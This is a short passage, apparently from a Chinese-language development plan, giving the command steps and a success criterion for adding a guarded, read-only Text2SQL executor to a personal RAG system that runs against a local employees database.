..\.venv\Scripts\python.exe -m eval --retrieval-only          # 期望 Recall@5 99.01%
git tag baseline-p0

# 第 2 步：清理旧 collection（P0）
curl.exe -s -X DELETE http://localhost:6333/collections/personal_rag

# 第 3 步：验证 Text2SQL 通路可行性（P1 前的冒烟测试）
#   用 psql 建 kb_analytics 库 + employees 表，装载 10000 行，
#   然后手动跑一次 SELECT department, count(*) FROM employees GROUP BY department
#   期望看到 Sales 1042 / Engineering 1010

# 第 4 步：接入只读执行器（P2）
#   pip install sqlglot 后，把 5.2.4 的 10 条攻击载荷写成测试，先让它们全部失败，再写 guard 让它们通过
```

**验证改造成功的唯一标准**：

> 用改造前的同一句话问系统——`员工表中Sales部门和Engineering部门各有多少人？两者相差多少人？`
> **改造前答 1017（错 31.8 倍且自称"逻辑上可调和"）；改造后必须答 32，并展示出它执行的 SQL。**
